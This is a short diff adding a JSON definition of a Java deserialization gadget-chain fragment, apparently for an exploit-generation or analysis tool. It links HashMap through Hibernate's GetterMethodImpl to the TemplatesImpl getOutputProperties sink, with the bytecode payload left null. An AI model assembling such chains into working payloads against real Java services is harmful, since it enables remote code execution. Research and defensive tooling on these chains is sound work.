@@ -1,0 +1,23 @@
+{
+    "chain_type": "fragment: GetterMethodImpl → TemplatesImpl (minimal Hibernate link)",
+    "root_class": "java.util.HashMap",
+    "root_trigger": "readObject→putVal→hashCode",
+    "links": [
+        {
+            "class": "org.hibernate.property.access.spi.GetterMethodImpl",
+            "field_overrides": {
+                "containerClass": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+                "propertyName": "outputProperties"
+            }
+        },
+        {
+            "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+            "field_overrides": {
+                "_name": "exploit",
+                "_class": null,
+                "_bytecodes": null
+            }
+        }
+    ],
+    "sink_method": "TemplatesImpl.getOutputProperties"
+}
